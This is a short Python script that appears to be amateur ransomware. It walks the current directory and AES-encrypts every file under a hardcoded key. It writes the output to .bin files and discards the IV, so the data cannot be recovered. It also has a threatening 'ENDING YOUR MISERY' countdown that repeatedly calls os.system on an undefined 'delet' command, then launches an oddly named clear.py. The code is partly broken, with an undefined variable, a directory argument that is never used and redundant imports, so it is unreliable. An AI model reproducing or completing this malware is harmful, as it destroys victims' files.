import sys
import os
import ctypes
import socket    
import requests,re,os
import time
import sys
from os import system
from platform import platform
from time import sleep
from subprocess import call
from Cryptodome.Cipher import AES
from Cryptodome import Random
from binascii import b2a_hex


def encrypt_dir(path):
    for root, _, files in os.walk("."):
        for file in files:
            file_path = os.path.join(root, file)
            print(file_path + " is encrypting.")
            encrypt_file(file_path)


def encrypt_file(path):
    # get the plaintext
    with open(path) as f:
        plain_text = f.read()

    # The key length must be 16 (AES-128), 24 (AES-192), or 32 (AES-256) Bytes.
    key = b'this is a 16 key'

    iv = Random.new().read(AES.block_size)
    mycipher = AES.new(key, AES.MODE_CFB, iv)
    ciphertext = iv + mycipher.encrypt(plain_text.encode())

    # output
    with open(path + ".bin", "wb") as file_out:
        file_out.write(ciphertext[16:])


path = sys.argv[1]
if os.path.isdir(path) and os.path.exists(path):
    encrypt_dir(path)
elif os.path.isfile(path) and os.path.exists(path):
    encrypt_file(path)
else:
    print("ENDING YOUR MISERY in 10 seconds")
    print("10")
    time.sleep(1)
    os.system(delet)
    print("9")
    time.sleep(1)
    os.system(delet)
    print("8")
    time.sleep(1)
    os.system(delet)
    print("7")
    time.sleep(1)
    os.system(delet)
    print("6.")
    time.sleep(1)
    os.system(delet)
    print("5")
    time.sleep(1)
    os.system(delet)
    print("4")
    time.sleep(1)
    os.system(delet)
    print("3")
    time.sleep(1)
    os.system(delet)
    print("2")
    time.sleep(1)
    os.system(delet)
    print("1")
    time.sleep(1)
    os.system(delet)
    print("0")
    time.sleep(1)
    os.system(delet)
    time.sleep(5)
    call(["python", "$@#&/clear.py"])
